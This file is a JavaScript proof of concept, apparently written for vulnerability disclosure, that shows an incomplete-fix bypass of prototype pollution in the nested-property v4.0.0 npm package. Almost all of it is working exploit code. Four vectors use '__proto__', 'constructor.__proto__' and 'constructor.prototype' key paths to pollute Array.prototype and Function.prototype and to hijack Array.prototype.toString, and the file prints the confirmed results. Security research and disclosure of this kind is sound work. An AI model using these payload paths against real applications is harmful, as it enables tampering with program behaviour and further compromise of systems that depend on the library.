/**
 * Proof of Concept: Incomplete Fix Bypass in nested-property v4.0.0
 * Researcher: Ojas Mehta
 * Date: April 2, 2026
 *
 * Prerequisites:
 *   npm install nested-property@4.0.0
 *   node poc.js
 *
 * Confirmed on: Node.js v22.22.2, nested-property v4.0.0
 *
 * Expected output:
 *   [1] Array.prototype.polluted: true
 *   [1] Object.prototype.polluted: undefined
 *   [1] [].polluted: true
 *   [2] Function.prototype.polluted: true
 *   [2] (function(){}).polluted: true
 *   [3] [1,2,3].toString(): HIJACKED
 *   [3] ({}).toString(): [object Object]
 *   [4] [].injected: owned
 *   [4] ({}).injected: undefined
 */

const np = require("nested-property"); // v4.0.0

console.log("\n=== nested-property v4.0.0 — Prototype Pollution Bypass PoC ===");
console.log("Researcher: Ojas Mehta | Date: April 2, 2026\n");

// ---------------------------------------------------------------------------
// VECTOR 1: Array.prototype pollution via __proto__ key
// ---------------------------------------------------------------------------
console.log("--- Vector 1: Array.prototype via __proto__ ---");
np.set({ data: [] }, "data.__proto__.polluted", true);
console.log("[1] Array.prototype.polluted:", Array.prototype.polluted);   // true
console.log("[1] Object.prototype.polluted:", Object.prototype.polluted); // undefined
console.log("[1] [].polluted:", [].polluted);                             // true
delete Array.prototype.polluted; // cleanup

// ---------------------------------------------------------------------------
// VECTOR 2: Function.prototype pollution via constructor.__proto__
// ---------------------------------------------------------------------------
console.log("\n--- Vector 2: Function.prototype via constructor.__proto__ ---");
np.set({}, "constructor.__proto__.polluted", true);
console.log("[2] Function.prototype.polluted:", Function.prototype.polluted);   // true
console.log("[2] (function(){}).polluted:", (function() {}).polluted);          // true
delete Function.prototype.polluted; // cleanup

// ---------------------------------------------------------------------------
// VECTOR 3: Array.prototype method hijacking — highest practical impact
// ---------------------------------------------------------------------------
console.log("\n--- Vector 3: Array.prototype method hijacking ---");
np.set({ data: [] }, "data.__proto__.toString", () => "HIJACKED");
console.log("[3] [1,2,3].toString():", [1, 2, 3].toString()); // HIJACKED
console.log("[3] ({}).toString():", ({}).toString());          // [object Object]
delete Array.prototype.toString; // cleanup

// ---------------------------------------------------------------------------
// VECTOR 4: Array root + constructor.prototype
// ---------------------------------------------------------------------------
console.log("\n--- Vector 4: Array root + constructor.prototype ---");
np.set([], "constructor.prototype.injected", "owned");
console.log("[4] [].injected:", [].injected);    // owned
console.log("[4] ({}).injected:", ({}).injected); // undefined
delete Array.prototype.injected; // cleanup

console.log("\n=== All 4 vectors confirmed. Object.prototype guard bypassed silently. ===");
console.log("Note: No ObjectPrototypeMutationError was thrown for any of the above.\n");


